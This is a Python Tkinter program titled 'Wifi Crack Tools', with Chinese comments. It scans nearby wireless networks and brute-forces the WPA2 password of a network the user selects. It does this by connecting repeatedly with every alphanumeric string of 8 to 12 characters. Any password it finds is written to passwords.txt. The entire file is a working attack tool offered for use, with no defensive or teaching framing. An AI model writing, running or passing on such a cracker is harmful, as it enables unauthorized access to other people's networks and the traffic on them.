import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import pywifi
from pywifi import const
import itertools
import string

class WifiCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wifi Crack Tools")
        self.root.geometry("800x600")

        # 禁止最大化
        self.root.resizable(False, False)
        
        # 初始化WiFi接口
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        
        # 创建主框架
        self.main_frame = ttk.Frame(root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # WiFi列表框架
        self.list_frame = ttk.LabelFrame(self.main_frame, text="Available network", padding="5")
        self.list_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E))
        
        # WiFi列表
        self.wifi_list = ttk.Treeview(self.list_frame, columns=("SSID", "Signal", "Security"))
        self.wifi_list["columns"] = ("SSID", "Signal", "Security")
        self.wifi_list.heading("SSID", text="Network Name")
        self.wifi_list.heading("Signal", text="Signal Strength")
        self.wifi_list.heading("Security", text="Encryption")
        self.wifi_list.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        # 滚动条
        scrollbar = ttk.Scrollbar(self.list_frame, orient=tk.VERTICAL, command=self.wifi_list.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.wifi_list.configure(yscrollcommand=scrollbar.set)
        
        # 控制按钮框架
        self.control_frame = ttk.Frame(self.main_frame, padding="5")
        self.control_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E))
        
        # 扫描按钮
        self.scan_button = ttk.Button(self.control_frame, text="Scan", command=self.scan_networks)
        self.scan_button.grid(row=0, column=0, padx=5)
        
        # 破解按钮
        self.crack_button = ttk.Button(self.control_frame, text="Crack", command=self.start_cracking)
        self.crack_button.grid(row=0, column=1, padx=5)
        
        # 停止按钮
        self.stop_button = ttk.Button(self.control_frame, text="Stop", command=self.stop_cracking)
        self.stop_button.grid(row=0, column=2, padx=5)
        self.stop_button["state"] = "disabled"
        
        # 进度条
        self.progress = ttk.Progressbar(self.main_frame, length=300, mode='determinate')
        self.progress.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        # 状态标签
        self.status_var = tk.StringVar(value="Ready")
        self.status_label = ttk.Label(self.main_frame, textvariable=self.status_var)
        self.status_label.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E))
        
        # 日志输出区
        self.log_frame = ttk.LabelFrame(self.main_frame, text="log", padding="5")
        self.log_frame.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E))
        
        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=70, height=15)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        self.cracking = False
        self.crack_thread = None

    def scan_networks(self):
        self.wifi_list.delete(*self.wifi_list.get_children())
        self.status_var.set("Scanning...")
        self.log_text.insert(tk.END, "Start scanning for WiFi networks...\n")
        
        try:
            self.iface.scan()
            time.sleep(2)  # 等待扫描完成
            results = self.iface.scan_results()
            
            for i, result in enumerate(results):
                ssid = result.ssid
                signal = result.signal
                if result.akm[0] == const.AKM_TYPE_WPA2PSK:
                    security = "WPA2"
                elif result.akm[0] == const.AKM_TYPE_WPAPSK:
                    security = "WPA"
                else:
                    security = "Open"
                    
                self.wifi_list.insert("", "end", values=(ssid, signal, security))
            
            self.status_var.set(f"OK，Discover {len(results)} Networks")
            self.log_text.insert(tk.END, f"OK，Discover {len(results)} Networks\n")
            self.log_text.see(tk.END)
            
        except Exception as e:
            self.status_var.set(f"Error: {str(e)}")
            self.log_text.insert(tk.END, f"Error: {str(e)}\n")
            self.log_text.see(tk.END)

    def try_connect(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)

        self.iface.connect(tmp_profile)
        time.sleep(1)  # 等待连接完成

        if self.iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    def generate_passwords(self):
        chars = string.ascii_letters + string.digits
        for length in range(8, 13):
            for guess in itertools.product(chars, repeat=length):
                if not self.cracking:
                    break
                yield ''.join(guess)

    def crack_wifi(self, ssid):
        password_gen = self.generate_passwords()
        
        try:
            for idx, password in enumerate(password_gen):
                if not self.cracking:
                    break
                    
                self.status_var.set(f"Try: {password}")
                self.log_text.insert(tk.END, f"Try: {password}\n")
                self.log_text.see(tk.END)
                
                if self.try_connect(ssid, password):
                    self.log_text.insert(tk.END, f"\nFinish,Password is: {password}\n")
                    self.status_var.set(f"Finish,Password is: {password}")
                    with open('passwords.txt', 'a') as f:
                        f.write(f"Network: {ssid}, Password: {password}\n")
                    break
                
                # 更新进度条
                self.progress['value'] = (idx % 100)
                self.root.update_idletasks()
                    
        except Exception as e:
            self.log_text.insert(tk.END, f"Error: {str(e)}\n")
        finally:
            self.cracking = False
            self.stop_button["state"] = "disabled"
            self.scan_button["state"] = "normal"
            self.crack_button["state"] = "normal"
            self.progress['value'] = 0

    def start_cracking(self):
        selection = self.wifi_list.selection()
        if not selection:
            self.status_var.set("Please Select a WiFi to hack")
            return
            
        ssid = self.wifi_list.item(selection[0])['values'][0]
        
        self.cracking = True
        self.status_var.set(f"Starting {ssid}...")
        self.scan_button["state"] = "disabled"
        self.crack_button["state"] = "disabled"
        self.stop_button["state"] = "normal"
        
        self.crack_thread = threading.Thread(target=self.crack_wifi, args=(ssid,))
        self.crack_thread.daemon = True
        self.crack_thread.start()

    def stop_cracking(self):
        self.cracking = False
        self.status_var.set("Stoped")
        self.stop_button["state"] = "disabled"
        self.scan_button["state"] = "normal"
        self.crack_button["state"] = "normal"

def main():
    root = tk.Tk()
    app = WifiCrackerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
